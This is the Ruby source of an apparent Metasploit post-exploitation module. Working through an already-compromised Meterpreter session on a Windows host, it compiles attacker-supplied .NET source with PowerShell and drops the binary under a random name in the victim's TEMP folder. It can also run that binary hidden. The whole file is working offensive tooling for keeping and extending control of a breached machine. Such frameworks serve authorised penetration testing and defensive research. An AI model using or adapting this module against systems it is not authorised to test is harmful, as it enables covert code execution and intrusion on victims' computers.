##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/powershell'
require 'msf/core/exploit/powershell/dot_net'

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  include Msf::Post::Windows::Powershell
  include Msf::Exploit::Powershell::DotNet

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Powershell .NET Compiler",
        'Description'    => %q(
          This module will build a .NET source file using powershell. The compiler builds
          the executable or library in memory and produces a binary. After compilation the
          PowerShell session can also sign the executable if provided a path the
          a .pfx formatted certificate. Compiler options and a list of assemblies
          required can be configured in the datastore.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => 'RageLtMan <rageltman[at]sempervictus>',
        'Platform'       => [ 'windows' ],
        'SessionTypes'   => [ 'meterpreter' ],
        'Targets'        => [ [ 'Universal', {} ] ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Aug 14 2012'
      )
    )

    register_options(
      [
        OptPath.new('SOURCE_FILE', [true, 'Path to source code']),
        OptBool.new('RUN_BINARY', [false, 'Execute the generated binary', false]),
        OptString.new('ASSEMBLIES', [false, 'Any assemblies outside the defaults', "mscorlib.dll, System.dll, System.Xml.dll, System.Data.dll" ]),
        OptString.new('OUTPUT_TARGET', [false, 'Name and path of the generated binary, default random, omit extension' ]),
        OptString.new('COMPILER_OPTS', [false, 'Options to pass to compiler', '/optimize']),
        OptString.new('CODE_PROVIDER', [true, 'Code provider to use', 'Microsoft.CSharp.CSharpCodeProvider'])
      ], self.class
    )
    register_advanced_options(
      [
        OptString.new('NET_CLR_VER', [false, 'Minimum NET CLR version required to compile', '4.0'])
      ], self.class
    )
  end

  def run
    # Make sure we meet the requirements before running the script
    unless session.type == "meterpreter" || have_powershell?
      print_error "Incompatible Environment"
      return 0
    end

    # Havent figured this one out yet, but we need a PID owned by a user, can't steal tokens either
    if client.sys.config.is_system?
      print_error "Cannot run as system"
      return 0
    end

    # End of file marker
    eof = Rex::Text.rand_text_alpha(8)
    env_suffix = Rex::Text.rand_text_alpha(8)
    net_com_opts = {}
    net_com_opts[:target] =
      datastore['OUTPUT_TARGET'] ||
      "#{session.sys.config.getenv('TEMP')}\\#{Rex::Text.rand_text_alpha(rand(8) + 8)}.exe"
    net_com_opts[:com_opts] = datastore['COMPILER_OPTS']
    net_com_opts[:provider] = datastore['CODE_PROVIDER']
    net_com_opts[:assemblies] = datastore['ASSEMBLIES']
    net_com_opts[:net_clr] = datastore['NET_CLR_VER']
    net_com_opts[:cert] = datastore['CERT_PATH']

    begin
      net_com_opts[:harness] = ::File.read(datastore['SOURCE_FILE'])
      script = dot_net_compiler(net_com_opts)
      if datastore['Powershell::Post::dry_run']
        print_good "Compiler code:\n#{script}"
        return
      end
    rescue => e
      print_error e
      return
    end

    vprint_good "Writing to #{net_com_opts[:target]}"

    # Execute the powershell script
    print_status 'Building remote code.'
    cmd_out, running_pids, open_channels = execute_script(script, true)
    get_ps_output(cmd_out, eof)
    vprint_good "Cleaning up #{running_pids.join(', ')}"

    clean_up(nil, eof, running_pids, open_channels, env_suffix, false)

    # Check for result
    begin
      size = session.fs.file.stat(net_com_opts[:target].gsub('\\', '\\\\')).size
      print_good "File #{net_com_opts[:target].gsub('\\', '\\\\')} found, #{size}kb"
    rescue
      print_error "File #{net_com_opts[:target].gsub('\\', '\\\\')} not found," \
                  " NET CLR version #{datastore['NET_CLR_VER']} possibly not available"
      return
    end

    # Run the result
    if datastore['RUN_BINARY']
      cmd_out = session.sys.process.execute(net_com_opts[:target].gsub('\\', '\\\\'),
                                            nil, 'Hidden' => true, 'Channelized' => true)
      while (out = cmd_out.channel.read)
        print_good out
      end
    end

    print_good 'Finished!'
  end
end
